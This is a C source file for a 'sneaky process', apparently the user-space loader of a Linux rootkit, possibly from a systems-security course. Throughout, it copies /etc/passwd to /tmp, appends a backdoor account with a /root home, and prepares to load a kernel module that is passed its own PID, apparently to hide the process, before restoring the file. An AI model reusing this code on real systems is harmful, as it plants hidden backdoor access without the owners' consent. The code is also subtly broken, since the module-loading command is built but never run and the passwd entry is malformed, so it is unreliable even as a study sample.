#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/wait.h>

int main()
{
    // 1. print pid
    printf("sneaky_process pid = %d\n", getpid());

    // 2.1. copy the /etc/passwd file to a new file: /tmp/passwd
    int fd = system("cp /etc/passwd /tmp/passwd");

    // 2.2 add new user
    char sneakyuser[] = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
    int passwd_fd = open("/etc/passwd", O_WRONLY | O_APPEND);
    write(passwd_fd, sneakyuser, strlen(sneakyuser));
    close(passwd_fd);

    // 3. load the sneaky module (sneaky_mod.ko)
    char argv_load[100];
    fd = sprintf(argv_load, "insmod sneaky_mod.ko pid=%d", getpid());

    // 4. loop to receive character from the keyboard input
    while (getchar() != 'q') {
    }

    // 5. unload the sneaky kernel module
    fd = system("rmmod sneaky_mod.ko");

    // 6. restore the /etc/passwd file
    fd = system("cp /tmp/passwd /etc/passwd");

    return 0;
}
